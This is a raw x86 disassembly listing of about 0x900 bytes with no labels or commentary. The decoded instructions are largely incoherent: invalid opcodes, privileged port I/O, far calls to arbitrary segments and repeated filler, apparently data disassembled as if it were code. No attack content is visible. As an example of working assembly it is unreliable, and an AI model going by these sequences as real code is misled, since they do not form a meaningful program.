  4172be:	adc    dl,bl
  4172c0:	xlat   BYTE PTR ds:[ebx]
  4172c1:	in     eax,dx
  4172c2:	push   ecx
  4172c3:	fucom  st(6)
  4172c5:	xor    BYTE PTR [ecx],ah
  4172c7:	sub    bl,BYTE PTR [ecx]
  4172c9:	sbb    al,BYTE PTR [edi+0x32]
  4172cc:	or     al,0xee
  4172ce:	and    ch,bl
  4172d0:	out    0x21,al
  4172d2:	and    esi,DWORD PTR [ebx]
  4172d4:	add    esp,esp
  4172d6:	sub    eax,DWORD PTR cs:[ebx]
  4172d9:	adc    edx,DWORD PTR ss:[edx+ebx*8]
  4172dd:	in     eax,dx
	...
  4172ee:	add    BYTE PTR [eax],al
  4172f0:	add    ch,bl
  4172f2:	out    0xd9,al
  4172f4:	ja     0x417329
  4172f6:	lods   al,BYTE PTR ds:[esi]
  4172f7:	push   ebp
  4172f8:	mov    ebx,0x1551b933
  4172fd:	pop    es
  4172fe:	lods   eax,DWORD PTR ds:[esi]
  4172ff:	dec    edi
  417300:	shl    dh,0xac
  417303:	sbb    bl,ch
  417305:	push   es
  417306:	lods   eax,DWORD PTR ds:[esi]
  417307:	dec    edi
  417308:	mov    al,ds:0xf032be50
  41730d:	adc    edx,DWORD PTR [eax-0x32ec2cd1]
  417313:	sub    ecx,ebx
  417315:	xor    ah,bh
  417317:	push   esi
  417318:	mov    ebp,0xe752b348
  41731d:	xor    al,0xac
  41731f:	inc    edi
  417320:	ret    0x892f
  417323:	sbb    cl,bl
  417325:	dec    eax
  417326:	fwait
  417327:	push   ebx
  417328:	rcl    bl,1
  41732a:	mov    esp,0x4a33abf2
  41732f:	ss xchg edi,eax
  417331:	push   ss
  417332:	push   ebx
  417333:	xor    eax,0x422633f0
  417338:	inc    esp
  417339:	sub    BYTE PTR ss:[esi+0x33],dl
  41733d:	cmp    ebx,DWORD PTR [ecx]
  41733f:	sbb    DWORD PTR [edx+0x2e],edx
  417342:	or     al,0x42
  417344:	cmp    al,0x37
  417346:	add    BYTE PTR [ecx],cl
  417348:	(bad)
  41734b:	or     eax,0x3a503332
  417350:	fistp  WORD PTR [eax]
  417352:	jbe    0x417358
	...
  417364:	add    BYTE PTR [eax],al
  417366:	(bad)  
  417367:	pop    ss
  417368:	add    BYTE PTR [edi],ch
  41736a:	inc    eax
  41736b:	aaa    
  41736c:	and    BYTE PTR [edx],ch
  41736e:	or     DWORD PTR [edx],ebx
  417370:	outs   dx,BYTE PTR ds:[esi]
  417371:	std    
  417372:	repz inc esp
  417374:	push   esp
  417375:	sbb    DWORD PTR [esp+eax*2-0x1610fa99],ecx
  41737c:	arpl   cx,bp
  41737e:	and    edi,DWORD PTR [esi]
  417380:	jno    0x41735c
  417382:	shr    BYTE PTR [ebx],0x72
  417385:	(bad)
  417388:	arpl   bx,bx
  41738a:	and    DWORD PTR [edx],ebp
  41738c:	jb     0x41732d
  41738e:	adc    dh,BYTE PTR [edx]
  417390:	arpl   cx,bp
  417392:	scas   al,BYTE PTR es:[edi]
  417393:	pop    ss
  417394:	arpl   WORD PTR [ebx-0x5fffbce6],di
  41739a:	jmp    0x1301e7c4
  41739f:	sub    eax,DWORD PTR [eax+edx*4+0x5]
  4173a3:	sub    ah,BYTE PTR [ecx-0x6b]
  4173a6:	fcomp  DWORD PTR [eax]
  4173a8:	ja     0x417393
  4173aa:	ret    
  4173ab:	sub    esi,DWORD PTR [edx-0x6b]
  4173ae:	jmp    0xfeccdecc
  4173b3:	sbb    BYTE PTR [eax],al
  4173b5:	call   0x32c5:0x8c7618f6
  4173bc:	ja     0x417437
  4173be:	out    0x6,al
  4173c0:	adc    cl,ch
  4173c2:	repz push es
  4173c4:	popf   
  4173c5:	es mov bl,0x6
  4173c8:	push   0x4c
	...
  4173da:	add    BYTE PTR [eax],al
  4173dc:	and    DWORD PTR [ecx],0x7f
  4173df:	es sub ah,ch
  4173e2:	mov    ch,0x0
  4173e4:	nop
  4173e5:	push   es
  4173e6:	mov    al,ds:0x66b2acf8
  4173eb:	dec    ebp
  4173ec:	loopne 0x4173f0
  4173ee:	xor    ch,BYTE PTR [esi]
  4173f0:	mov    esp,0xa7392fbf
  4173f5:	xchg   edx,eax
  4173f6:	xor    al,0x0
  4173f8:	cdq    
  4173f9:	fwait
  4173fa:	add    ecx,DWORD PTR [eax]
  4173fc:	mov    dl,0x7
  4173fe:	std    
  4173ff:	add    al,0x8c
  417401:	push   es
  417402:	inc    DWORD PTR [edx]
  417404:	mov    DWORD PTR [edx],esi
  417406:	imul   esp,DWORD PTR [esi-0x63],0xffffffd6
  41740a:	pop    esp
  41740b:	jb     0x417409
  41740d:	dec    esi
  41740e:	dec    esp
  41740f:	imul   eax,DWORD PTR [edi+0x3d466ee8],0xa0535c39
  417419:	in     eax,dx
  41741a:	pusha  
  41741b:	and    BYTE PTR [eax+ebp*8-0x3d19e93],dl
  417422:	jno    0x417424
  417424:	mov    eax,ds:0x49746efe
  417429:	dec    esp
  41742a:	outs   dx,DWORD PTR ds:[esi]
  41742b:	mov    ecx,DWORD PTR gs:[ecx]
  41742e:	push   eax
  41742f:	popa   
  417430:	mov    dl,dl
  417432:	dec    DWORD PTR [edi+0x66]
  417435:	shl    DWORD PTR [ebx+0x0],cl
  417438:	jnp    0x417436
  41743a:	push   0x1ffc8d6f
  41743f:	inc    esp
	...
  417450:	add    BYTE PTR [eax],al
  417452:	jo     0x417427
  417454:	call   FWORD PTR [ebx+0x4a]
  417457:	lock popa 
  417459:	gs fwait
  41745b:	std    
  41745c:	jo     0x4174c1
  41745e:	jb     0x417469
  417460:	cs fs jl 0x417446
  417464:	data16 add BYTE PTR [ecx+ebx*8-0x16188da0],bl
  41746c:	push   0x6e
  41746e:	lock dec ebx
  417470:	sbb    esp,DWORD PTR [ebp-0x10]
  417473:	or     DWORD PTR [ecx],esi
  417475:	arpl   WORD PTR [edx+ebx*8+0x1a],sp
  417479:	outs   dx,BYTE PTR ds:[esi]
  41747a:	dec    edi
  41747b:	push   cs
  41747c:	push   ss
  41747d:	pop    edi
  41747e:	pop    ebp
  41747f:	dec    ebx
  417480:	out    0x21,eax
  417482:	lock (bad) 
  417485:	jbe    0x4174d8
  417487:	repnz cs arpl bp,si
  41748b:	iret   
  41748c:	add    DWORD PTR [ecx+0x1f],edx
  41748f:	or     al,0x30
  417491:	jne    0x4174a4
  417493:	add    BYTE PTR [edi],bl
  417495:	pop    esp
  417496:	inc    ebx
  417497:	not    DWORD PTR [esi]
  417499:	ins    DWORD PTR es:[edi],dx
  41749a:	push   es
  41749b:	repnz and dh,BYTE PTR [eax+ebx*1+0xf]
  4174a0:	pop    ss
  4174a1:	pop    esp
  4174a2:	and    BYTE PTR [ebx-0x3de6abb3],dl
  4174a8:	push   edx
  4174a9:	arpl   WORD PTR [ebx],ax
  4174ab:	rcr    DWORD PTR [ebp*2+0x4801c0de],0xd7
  4174b3:	shr    BYTE PTR ds:0x4e,0x0
	...
  4174c6:	add    BYTE PTR [eax],al
  4174c8:	shl    DWORD PTR [edx+0x60bd0020],1
  4174ce:	and    BYTE PTR [edx-0x42],dh
  4174d1:	into   
  4174d2:	sbb    BYTE PTR [ebx-0x10],ah
  4174d5:	jge    0x4174fb
  4174d7:	jno    0x41749c
  4174d9:	jl     0x4174f1
  4174db:	jb     0x4174a9
  4174dd:	lods   eax,DWORD PTR ds:[esi]
  4174de:	push   ecx
  4174df:	ins    DWORD PTR es:[edi],dx
  4174e0:	mov    ds:0x95733379,al
  4174e5:	(bad)  
  4174e6:	and    BYTE PTR [edx-0x10],dh
  4174e9:	jns    0x41750b
  4174eb:	jb     0x417472
  4174ed:	jbe    0x417502
  4174ef:	pop    edi
  4174f0:	pushf  
  4174f1:	jns    0x41751f
  4174f3:	jo     0x417482
  4174f5:	lods   eax,DWORD PTR ds:[esi]
  4174f6:	xor    esi,DWORD PTR [eax-0x80]
  4174f9:	push   es
  4174fa:	sub    eax,0x5eeca050
  4174ff:	sbb    DWORD PTR [edi+eax*1+0x33],ebx
  417503:	ss push ebp
  417505:	adc    eax,DWORD PTR [esp+esi*1+0x3f]
  417509:	and    edx,DWORD PTR [edx]
  41750b:	fcmovnbe st,st(7)
  41750d:	cmp    BYTE PTR [esi+0x1e],cl
  417510:	inc    esp
  417511:	adc    al,0x48
  417513:	xor    dl,BYTE PTR [ebx+0x3b]
  417516:	sub    dl,BYTE PTR [edi]
  417518:	push   esi
  417519:	and    eax,0x1231210c
  41751e:	pop    ss
  41751f:	in     al,0x40
  417521:	sub    al,0xd
  417523:	xor    BYTE PTR ds:0xf0211926,bl
  417529:	inc    esp
  41752a:	sbb    edx,DWORD PTR [eax+eax*1+0x0]
	...
  41753e:	shl    BYTE PTR [edx],1
  417540:	add    al,0x33
  417542:	add    al,0x2e
  417544:	add    eax,0xfe2dfc25
  417549:	adc    eax,0x31cc17d0
  41754e:	(bad)  
  41754f:	and    ecx,ebx
  417551:	add    esi,DWORD PTR [esi-0x2c1c48ce]
  417557:	and    edx,ebx
  417559:	das    
  41755a:	xlat   BYTE PTR ds:[ebx]
  41755b:	sub    al,0xc8
  41755d:	das    
  41755e:	iret   
  41755f:	sub    ecx,ebp
  417561:	jecxz  0x417525
  417563:	pop    ss
  417564:	int3   
  417565:	xor    eax,esi
  417567:	inc    esp
  417568:	xchg   ebx,eax
  417569:	push   ebx
  41756a:	adc    BYTE PTR [ebx],ah
  41756c:	mov    WORD PTR [edx],?
  41756e:	mov    esp,0xa4248d2d
  417573:	sub    eax,0x16d01586
  417578:	mov    BYTE PTR [edx],dh
  41757a:	mov    eax,ds:0x8c319613
  41757f:	push   es
  417580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417581:	dec    edi
  417582:	mov    al,ds:0xd08cffe6
  417587:	adc    eax,0x3be58074
  41758c:	je     0x4175de
  41758e:	(bad)  [eax+eiz*1]
  417591:	pop    ecx
  417592:	add    eax,0x25e97415
  417597:	xor    edx,DWORD PTR [eax+0x9]
  41759a:	adc    BYTE PTR [esi],ah
  41759c:	jno    0x4175db
  41759e:	sti    
  41759f:	sub    BYTE PTR [edi+0x35],bl
	...
  4175b2:	add    BYTE PTR [eax],al
  4175b4:	jmp    0x4175e1
  4175b6:	outs   dx,BYTE PTR ds:[esi]
  4175b7:	or     DWORD PTR [ecx],edx
  4175b9:	cmp    dh,BYTE PTR [eax+ecx*2-0x28]
  4175bd:	sub    esp,DWORD PTR [ebp-0x17]
  4175c0:	cmc    
  4175c1:	xor    dl,BYTE PTR [eax-0x37]
  4175c4:	jecxz  0x4175da
  4175c6:	ins    DWORD PTR es:[edi],dx
  4175c7:	ud2    
  4175c9:	sub    esp,DWORD PTR [ebx+0x1a]
  4175cc:	hlt    
  4175cd:	inc    eax
  4175ce:	push   esp
  4175cf:	sbb    DWORD PTR [ecx+0x2f],eax
  4175d2:	arpl   WORD PTR ds:0xfd6606e8,cx
  4175d8:	ret    
  4175d9:	pop    ss
  4175da:	push   0x2e2ad804
  4175df:	iret   
  4175e0:	shl    BYTE PTR [ecx],0x0
  4175e3:	mov    edx,0xde742104
  4175e8:	adc    dl,BYTE PTR ds:0xda26ad63
  4175ee:	push   eax
  4175ef:	adc    al,0xc1
  4175f1:	sub    esp,DWORD PTR [esi-0x4b]
  4175f4:	mov    bh,0x40
  4175f6:	push   esp
  4175f7:	cdq    
  4175f8:	or     ch,BYTE PTR [ecx]
  4175fa:	mov    si,0x37b7
  4175fe:	arpl   WORD PTR [ebp-0x5affe8fa],bx
  417604:	rcl    BYTE PTR [edx],cl
  417606:	pop    edi
  417607:	lods   eax,DWORD PTR ds:[esi]
  417608:	or     dl,BYTE PTR ds:0x32ddad00
  41760e:	push   eax
  41760f:	add    BYTE PTR [eax-0xc],ah
  417612:	outs   dx,DWORD PTR gs:[esi]
  417614:	sbb    DWORD PTR [edi],esi
  417616:	popa   
  417617:	jb     0x417619
	...
  417629:	add    BYTE PTR [edi+0x704c71f8],al
  41762f:	xlat   BYTE PTR ds:[ebx]
  417630:	jae    0x417660
  417632:	xchg   ecx,eax
  417633:	icebp  
  417634:	imul   eax,DWORD PTR [eax],0x1f
  417637:	cli    
  417638:	ja     0x4176af
  41763a:	dec    edx
  41763b:	fldenv [esp+ebp*2+0x34]
  41763f:	add    esp,DWORD PTR [esi+0x74]
  417642:	sbb    eax,ebx
  417644:	fs je  0x41767b
  417647:	mov    cl,0x66
  417649:	outs   dx,BYTE PTR ds:[esi]
  41764a:	xor    BYTE PTR [ebx],al
  41764c:	inc    esi
  41764d:	popa   
  41764e:	cli    
  41764f:	(bad)  
  417650:	dec    esi
  417651:	je     0x417631
  417653:	lock pusha 
  417655:	and    bl,bl
  417657:	aam    0x6a
  417659:	ja     0x417665
  41765b:	cli    
  41765c:	jno    0x41765e
  41765e:	xlat   BYTE PTR ds:[ebx]
  41765f:	ss push eax
  417661:	dec    esp
  417662:	add    al,bl
  417664:	jae    0x417694
  417666:	cmc    
  417667:	in     al,0xff
  417669:	pop    ebx
  41766a:	int3   
  41766b:	in     eax,0x6f
  41766d:	ins    BYTE PTR es:[edi],dx
  41766e:	hlt    
  41766f:	aaa    
  417670:	je     0x4176e7
  417672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417673:	cld    
  417674:	push   0x5c
  417676:	call   0x4ff8:0x2c6f71fd
  41767d:	ins    BYTE PTR es:[edi],dx
  41767e:	inc    esp
  41767f:	(bad)  
  417680:	jmp    FWORD PTR [edx]
  417682:	mov    DWORD PTR [ebp+0x0],eax
  417685:	ret    
  417686:	xchg   ebp,eax
  417687:	inc    ebp
  417688:	add    BYTE PTR [ebp-0x69],ah
  41768b:	inc    ebp
  41768c:	add    BYTE PTR [edi+0x0],bl
	...
  41769f:	add    BYTE PTR [ebx+0x7cd70045],dl
  4176a5:	inc    ebp
  4176a6:	add    BYTE PTR [ecx],al
  4176a8:	imul   eax,DWORD PTR [ebp+0x0],0x415bf0df
  4176af:	add    BYTE PTR [edx+edx*2+0x41],al
  4176b3:	add    BYTE PTR [esi],dh
  4176b5:	jns    0x4176f8
  4176b7:	add    BYTE PTR [ebp-0x17ffbe99],ch
  4176bd:	jbe    0x417700
  4176bf:	add    BYTE PTR [edi+0x10004174],bl
  4176c5:	inc    edx
  4176c6:	inc    esp
  4176c7:	add    BYTE PTR [edx+0x4e],ah
  4176ca:	inc    esp
  4176cb:	add    BYTE PTR [ecx],bl
  4176cd:	dec    ebp
  4176ce:	inc    esp
  4176cf:	add    BYTE PTR [ebp+ecx*2+0x4dc70044],ah
  4176d6:	inc    esp
  4176d7:	add    BYTE PTR [ecx+0x42],bl
  4176da:	inc    esp
  4176db:	add    ch,dl
  4176dd:	dec    edx
  4176de:	inc    esp
  4176df:	add    al,al
  4176e1:	inc    eax
  4176e2:	inc    esp
  4176e3:	add    BYTE PTR [ecx],dl
  4176e5:	or     DWORD PTR [eax+eax*1-0x7d],eax
  4176e9:	hlt    
  4176ea:	inc    ebx
  4176eb:	add    BYTE PTR [ebx],bl
  4176ed:	add    eax,DWORD PTR [eax+eax*1-0x7a]
  4176f1:	cdq    
  4176f2:	inc    ecx
  4176f3:	add    BYTE PTR [edx+0x3c00419e],al
  4176f9:	lahf   
  4176fa:	inc    ecx
  4176fb:	add    BYTE PTR [ebx],bh
  4176fd:	pushf  
  4176fe:	inc    ecx
  4176ff:	add    BYTE PTR [edi],al
  417701:	xchg   edx,eax
  417702:	inc    ecx
	...
  417713:	add    BYTE PTR [eax],al
  417715:	add    al,bl
  417717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417718:	inc    ecx
  417719:	add    cl,dl
  41771b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41771c:	inc    ecx
  41771d:	add    BYTE PTR [ecx],bh
  41771f:	mov    dh,0x41
  417721:	add    ah,bh
  417723:	mov    ah,0x41
  417725:	add    ch,cl
  417727:	les    eax,FWORD PTR [ecx+0x0]
  41772a:	mov    ebx,0x9f00441f
  41772f:	es inc esp
  417731:	add    BYTE PTR [edi],dl
  417733:	and    al,0x44
  417735:	add    BYTE PTR [edx],bl
  417737:	pop    es
  417738:	jge    0x41777e
  41773a:	lock and eax,0xeff04476
  417740:	outs   dx,BYTE PTR ds:[esi]
  417741:	inc    esp
  417742:	lock js 0x4177b4
  417745:	inc    esp
  417746:	lock loope 0x4177a8
  417749:	inc    esp
  41774a:	lock push 0x60
  41774d:	inc    esp
  41774e:	lock ficom WORD PTR [eax+0x44]
  417752:	lock mov esp,0x3ef04451
  417758:	add    BYTE PTR [ebx-0x10],0x54
  41775c:	add    BYTE PTR [ebx-0x10],0xa9
  417760:	jb     0x4177a5
  417762:	lock rol DWORD PTR [edx-0x6f350fbd],1
  417769:	inc    ebx
  41776a:	lock cdq 
  41776c:	nop
  41776d:	inc    ebx
  41776e:	lock mov ?,WORD PTR [edx+0x43]
  417772:	lock pop ebp
  417774:	jb     0x4177b9
  417776:	lock lods al,BYTE PTR ds:[esi]
  417778:	bound  eax,QWORD PTR [ebx+0x0]
	...
  41778b:	add    al,dh
  41778d:	adc    DWORD PTR [ebx+0x43],ebx
  417790:	lock pusha 
  417792:	push   ebx
  417793:	inc    ebx
  417794:	lock scas eax,DWORD PTR es:[edi]
  417796:	dec    ebx
  417797:	inc    ebx
  417798:	lock push cs
  41779a:	inc    esp
  41779b:	inc    ebx
  41779c:	lock sub eax,0x40f0433c
  4177a2:	xor    eax,0x2db6f043
  4177a7:	inc    ebx
  4177a8:	lock ins BYTE PTR es:[edi],dx
  4177aa:	daa    
  4177ab:	inc    ebx
  4177ac:	lock jecxz 0x4177d6
  4177af:	inc    ebx
  4177b0:	lock and DWORD PTR [eax],ebp
  4177b3:	inc    ebx
  4177b4:	lock mov ecx,0x42f04328
  4177ba:	sub    al,BYTE PTR [ebx-0x10]
  4177bd:	sub    al,BYTE PTR fs:[ebx-0x10]
  4177c1:	repz jmp FWORD PTR [ebx+esi*4]
  4177c5:	push   es
  4177c6:	cs and al,0xb3
  4177c9:	push   es
  4177ca:	test   al,0x2c
  4177cc:	mov    bl,0x6
  4177ce:	push   ebx
  4177cf:	xor    BYTE PTR [ebx-0x4cdf55fa],dh
  4177d5:	push   es
  4177d6:	adc    al,0x1c
  4177d8:	mov    bl,0x6
  4177da:	js     0x417810
  4177dc:	mov    bl,0x6
  4177de:	push   eax
  4177df:	sbb    BYTE PTR [ebx-0x4ce5a6fa],dh
  4177e5:	push   es
  4177e6:	cwde   
  4177e7:	adc    al,0xb3
  4177e9:	push   es
  4177ea:	fistp  QWORD PTR [esp+esi*1+0xc15307]
	...
  417801:	add    BYTE PTR [edi+eax*1],ch
  417804:	sahf   
  417805:	mov    cl,0x34
  417807:	pop    es
  417808:	sbb    al,0xb0
  41780a:	sub    al,0x7
  41780c:	mov    DWORD PTR [eax-0x5cf8f8cc],esp
  417812:	sub    al,0x7
  417814:	test   DWORD PTR [ebx-0x16fff8cc],edx
  41781a:	repz push es
  41781c:	add    cl,ch
  41781e:	repz push es
  417820:	add    cl,ch
  417822:	repz push es
  417824:	add    cl,ch
  417826:	repz push es
  417828:	add    cl,ch
  41782a:	repz push es
  41782c:	inc    ecx
  41782d:	adc    eax,0xf56e29db
  417832:	xchg   ebx,eax
  417833:	dec    esi
  417834:	pop    edi
  417835:	cli    
  417836:	retf   
  417837:	push   es
  417838:	push   ecx
  417839:	adc    eax,0xba533b33
  41783e:	pop    esi
  41783f:	dec    ebp
  417840:	dec    ebx
  417841:	mov    ecx,0x45438c0
  417846:	sar    DWORD PTR [edi],0x0
  417849:	add    al,0x8
  41784b:	in     eax,0x62
  41784d:	add    BYTE PTR [ecx],dh
  41784f:	in     eax,dx
  417850:	jmp    DWORD PTR [ecx+ecx*2]
  417853:	mov    esp,0xfc7d0055
  417858:	jo     0x4178bf
  41785a:	dec    ecx
  41785b:	xlat   BYTE PTR ds:[ebx]
  41785c:	fs fs inc edi
  41785f:	in     al,dx
  417860:	pop    esp
  417861:	je     0x41787c
  417863:	add    DWORD PTR ds:0xd,eax
	...
  417875:	add    BYTE PTR [eax],al
  417877:	add    BYTE PTR [ebx],dl
  417879:	add    eax,0xb429090a
  41787e:	ins    BYTE PTR es:[edi],dx
  41787f:	jne    0x417809
  417881:	test   eax,0xee390a0a
  417886:	pusha  
  417887:	ins    BYTE PTR es:[edi],dx
  417888:	sub    DWORD PTR [ecx],eax
  41788a:	and    DWORD PTR [ecx],esi
  41788c:	sub    DWORD PTR [edx-0x1f1ff5f6],ebp
  417892:	gs and al,ah
  417895:	test   eax,0xfc307862
  41789a:	jae    0x4178bc
  41789c:	shr    BYTE PTR [ecx-0x5637dae3],1
  4178a2:	push   es
  4178a3:	and    cl,bh
  4178a5:	fild   QWORD PTR [edx+0x74]
  4178a8:	ss stos DWORD PTR es:[edi],eax
  4178aa:	push   es
  4178ab:	and    dh,dh
  4178ad:	std    
  4178ae:	ins    BYTE PTR es:[edi],dx
  4178af:	or     DWORD PTR [ebx+eax*1-0x29139be0],esp
  4178b6:	pop    ds
  4178b7:	or     DWORD PTR [ecx-0x76dfd254],ebp
  4178bd:	test   eax,0xfabc221d
  4178c2:	and    DWORD PTR [eax],esp
  4178c4:	mov    ecx,0x89201da9
  4178c9:	fisub  DWORD PTR [edi+0x65]
  4178cc:	jne    0x4178b3
  4178ce:	inc    eax
  4178cf:	js     0x41790d
  4178d1:	jmp    0x7300:0x482c7470
  4178d8:	lock (bad) 
  4178da:	es ins BYTE PTR es:[edi],dx
	...
  4178ec:	add    BYTE PTR [eax],al
  4178ee:	(bad)  
  4178ef:	lock aad 0x2d
  4178f2:	aam    0xbb
  4178f4:	sub    eax,0x11c7cd00
  4178f9:	ins    BYTE PTR es:[edi],dx
  4178fa:	iret   
  4178fb:	push   ecx
  4178fc:	es jb  0x417905
  4178ff:	retf   
  417900:	sbb    DWORD PTR [ebx-0x10],esp
  417903:	push   eax
  417904:	out    dx,al
  417905:	cs aad 0xba
  417908:	out    dx,al
  417909:	fcomp  DWORD PTR cs:[edi-0x600fffff]
  417910:	xor    al,0x63
  417912:	mov    ecx,0x8263117a
  417917:	adc    BYTE PTR [eax],dh
  417919:	outs   dx,BYTE PTR ds:[esi]
  41791a:	xchg   ecx,eax
  41791b:	adc    esp,DWORD PTR [esi]
  41791d:	push   eax
  41791e:	add    BYTE PTR [esi+0x435c6717],0x25
  417925:	arpl   ax,si
  417927:	shl    BYTE PTR [esi],1
  417929:	push   esp
  41792a:	push   ebx
  41792b:	inc    eax
  41792c:	xor    al,0x72
  41792e:	dec    ecx
  41792f:	cmp    al,0x2b
  417931:	ins    BYTE PTR es:[edi],dx
  417932:	push   ebp
  417933:	inc    ebp
  417934:	daa    
  417935:	add    BYTE PTR [ebx],ah
  417937:	dec    ebx
  417938:	inc    ecx
  417939:	push   0x63254c51
  41793e:	es aad 0x17
  417941:	addr16 push ss
  417943:	out    0x33,eax
  417945:	jb     0x417960
  417947:	cld    
  417948:	sub    ch,BYTE PTR [ebp+edx*1+0x5]
  41794c:	daa    
  41794d:	add    BYTE PTR [ebx+0xb],al
  417950:	inc    ecx
  417951:	jb     0x417953
	...
  417963:	add    BYTE PTR ds:0x1c6317ff,dl
  417969:	add    eax,0xee0e6329
  41796e:	adc    DWORD PTR [edi-0x2],esp
  417971:	push   es
  417972:	xor    BYTE PTR [ebx-0x29],ah
  417975:	push   es
  417976:	int3   
  417977:	add    eax,ecx
  417979:	sub    DWORD PTR [ecx-0x23e02edc],ebp
  41797f:	adc    eax,eax
  417981:	sbb    al,al
  417983:	adc    eax,0x26cc22d7
  417988:	rol    DWORD PTR [esi],cl
  41798a:	call   0xc517:0xba29a228
  417991:	sbb    ah,al
  417993:	xor    esp,DWORD PTR [edx-0x6bd362e3]
  417999:	sub    DWORD PTR [esi-0x73c80fd8],eax
  41799f:	dec    esp
  4179a0:	xchg   BYTE PTR [edi],ah
  4179a2:	cdq    
  4179a3:	sub    BYTE PTR [edi-0x7ccb73e9],ch
  4179a9:	and    esi,DWORD PTR [ebx+0x24]
  4179ac:	mov    al,ds:0x8f158018
  4179b1:	and    al,BYTE PTR [esi+eiz*1+0x293a0753]
  4179b8:	daa    
  4179b9:	sbb    BYTE PTR [edx+0x2d],bl
  4179bc:	push   ebp
  4179bd:	and    eax,0x224f1237
  4179c2:	dec    eax
  4179c3:	adc    al,BYTE PTR [edi+0x3b]
  4179c6:	push   esi
  4179c7:	sub    eax,DWORD PTR [eax]
	...
  4179d9:	add    BYTE PTR [ebx+0x25],dl
  4179dc:	pop    ss
  4179dd:	adc    dl,BYTE PTR [edi+0x1d]
  4179e0:	inc    eax
  4179e1:	xor    BYTE PTR [ebx+0x2c],dl
  4179e4:	inc    esp
  4179e5:	add    al,0xf0
  4179e7:	push   es
  4179e8:	out    0x3,eax
  4179ea:	lock push es
  4179ec:	out    0x3,eax
  4179ee:	lock push es
  4179f0:	out    0x3,eax
  4179f2:	lock push es
  4179f4:	out    0x3,eax
  4179f6:	lock push es
  4179f8:	out    0x3,eax
  4179fa:	lock push es
  4179fc:	out    0x3,eax
  4179fe:	lock push es
  417a00:	add    cl,ch
  417a02:	repz push es
  417a04:	add    cl,ch
  417a06:	repz push es
  417a08:	add    cl,ch
  417a0a:	repz push es
  417a0c:	add    cl,ch
  417a0e:	repz push es
  417a10:	add    cl,ch
  417a12:	repz push es
  417a14:	add    cl,ch
  417a16:	repz push es
  417a18:	add    cl,ch
  417a1a:	repz push es
  417a1c:	add    cl,ch
  417a1e:	repz push es
  417a20:	add    cl,ch
  417a22:	repz push es
  417a24:	add    cl,ch
  417a26:	repz push es
  417a28:	add    cl,ch
  417a2a:	repz push es
  417a2c:	add    cl,ch
  417a2e:	repz push es
  417a30:	add    cl,ch
  417a32:	repz push es
  417a34:	add    cl,ch
  417a36:	repz push es
  417a38:	add    cl,ch
  417a3a:	repz push es
  417a3c:	add    cl,ch
	...
  417a4e:	add    BYTE PTR [eax],al
  417a50:	repz push es
  417a52:	add    cl,ch
  417a54:	repz push es
  417a56:	add    cl,ch
  417a58:	repz push es
  417a5a:	add    cl,ch
  417a5c:	repz push es
  417a5e:	add    cl,ch
  417a60:	repz push es
  417a62:	add    cl,ch
  417a64:	repz push es
  417a66:	add    cl,ch
  417a68:	repz push es
  417a6a:	add    cl,ch
  417a6c:	repz push es
  417a6e:	add    cl,ch
  417a70:	repz push es
  417a72:	add    cl,ch
  417a74:	repz push es
  417a76:	add    cl,ch
  417a78:	repz push es
  417a7a:	add    cl,ch
  417a7c:	repz push es
  417a7e:	add    cl,ch
  417a80:	repz push es
  417a82:	add    cl,ch
  417a84:	repz push es
  417a86:	add    cl,ch
  417a88:	repz push es
  417a8a:	add    BYTE PTR [eax],al
  417a8c:	cdq    
  417a8d:	push   es
  417a8e:	add    BYTE PTR [eax],al
  417a90:	mov    DWORD PTR [esi],eax
  417a92:	add    BYTE PTR [eax],al
  417a94:	mov    DWORD PTR [esi],eax
  417a96:	add    BYTE PTR [eax],al
  417a98:	pop    ecx
  417a99:	push   es
  417a9a:	add    BYTE PTR [eax],al
  417a9c:	pop    ecx
  417a9d:	push   es
  417a9e:	add    BYTE PTR [eax],al
  417aa0:	dec    ecx
  417aa1:	push   es
  417aa2:	add    BYTE PTR [eax],al
  417aa4:	dec    ecx
  417aa5:	push   es
  417aa6:	add    BYTE PTR [eax],al
  417aa8:	pop    ecx
  417aa9:	push   es
  417aaa:	add    BYTE PTR [eax],al
  417aac:	pop    ecx
  417aad:	push   es
  417aae:	add    BYTE PTR [eax],al
  417ab0:	dec    ecx
  417ab1:	push   es
	...
  417ac6:	dec    ecx
  417ac7:	push   es
  417ac8:	add    BYTE PTR [eax],al
  417aca:	sbb    DWORD PTR [esi],eax
  417acc:	add    BYTE PTR [eax],al
  417ace:	sbb    DWORD PTR [esi],eax
  417ad0:	add    BYTE PTR [eax],al
  417ad2:	or     DWORD PTR [esi],eax
  417ad4:	add    BYTE PTR [eax],al
  417ad6:	or     DWORD PTR [esi],eax
  417ad8:	add    BYTE PTR [eax],al
  417ada:	sbb    DWORD PTR [esi],eax
  417adc:	add    BYTE PTR [eax],al
  417ade:	sbb    DWORD PTR [esi],eax
  417ae0:	add    BYTE PTR [eax],al
  417ae2:	or     DWORD PTR [esi],eax
  417ae4:	add    BYTE PTR [eax],al
  417ae6:	or     DWORD PTR [esi],eax
  417ae8:	add    BYTE PTR [eax],al
  417aea:	fld    DWORD PTR ds:0x5d90000
  417af0:	add    BYTE PTR [eax],al
  417af2:	leave  
  417af3:	add    eax,0x5c90000
  417af8:	add    BYTE PTR [eax],al
  417afa:	fld    DWORD PTR ds:0x5d90000
  417b00:	add    BYTE PTR [eax],al
  417b02:	leave  
  417b03:	add    eax,0x5c90000
  417b08:	add    BYTE PTR [eax],al
  417b0a:	cdq    
  417b0b:	add    eax,0x5990000
  417b10:	add    BYTE PTR [eax],al
  417b12:	mov    DWORD PTR ds:0x9ff00000,eax
  417b18:	add    DWORD PTR [eax],eax
  417b1a:	lock lahf 
  417b1c:	add    DWORD PTR [eax],eax
  417b1e:	lock lahf 
  417b20:	add    DWORD PTR [eax],eax
  417b22:	lock lahf 
  417b24:	add    DWORD PTR [eax],eax
  417b26:	lock lahf 
  417b28:	add    DWORD PTR [eax],eax
	...
  417b3a:	add    BYTE PTR [eax],al
  417b3c:	lock lahf 
  417b3e:	add    DWORD PTR [eax],eax
  417b40:	lock lahf 
  417b42:	add    DWORD PTR [eax],eax
  417b44:	lock lahf 
  417b46:	add    DWORD PTR [eax],eax
  417b48:	lock lahf 
  417b4a:	add    DWORD PTR [eax],eax
  417b4c:	lock lahf 
  417b4e:	add    DWORD PTR [eax],eax
  417b50:	lock lahf 
  417b52:	add    DWORD PTR [eax],eax
